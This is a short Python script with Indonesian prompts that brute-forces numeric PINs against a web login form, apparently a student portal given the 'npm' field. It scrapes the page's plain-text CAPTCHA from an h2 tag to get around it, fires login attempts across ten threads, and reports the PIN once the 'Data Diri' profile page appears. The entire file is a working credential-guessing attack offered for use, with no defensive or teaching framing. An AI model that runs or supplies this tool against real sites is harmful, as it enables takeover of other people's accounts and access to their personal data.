import requests
from bs4 import BeautifulSoup
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Input fields for user
url_login = input("masukan url : ").strip()
username = input("username : ").strip()
pin_start = int(input("masukan PIN awal : ").strip())
pin_end = int(input("masukan PIN akhir : ").strip())

session = requests.Session()
found = threading.Event()  # Flag untuk menghentikan semua thread jika password ditemukan

# Worker function untuk brute force
def try_pin(pin):
    if found.is_set():
        return None
    try:
        r = session.get(url_login)
        soup = BeautifulSoup(r.text, "html.parser")
        captcha_tag = soup.find("h2")
        if not captcha_tag:
            return f"[!] Tidak dapat menemukan CAPTCHA pada halaman login."
        captcha = captcha_tag.text.strip()
        password = str(pin)
        payload = {
            "npm": username,
            "pass": password,
            "cap": captcha
        }
        res = session.post(url_login, data=payload)
        soup = BeautifulSoup(res.text, "html.parser")
        if soup.find("b", string="Data Diri"):
            found.set()
            return f"[✓] Password ditemukan: {password}"
        else:
            return f"[X] {password} salah (CAPTCHA {captcha})"
    except Exception as e:
        return f"[!] Error pada {pin}: {e}"

# Jumlah thread bisa diatur sesuai kebutuhan
max_workers = 10

with ThreadPoolExecutor(max_workers=max_workers) as executor:
    futures = {executor.submit(try_pin, pin): pin for pin in range(pin_start, pin_end + 1)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(result)
        if found.is_set():
            break
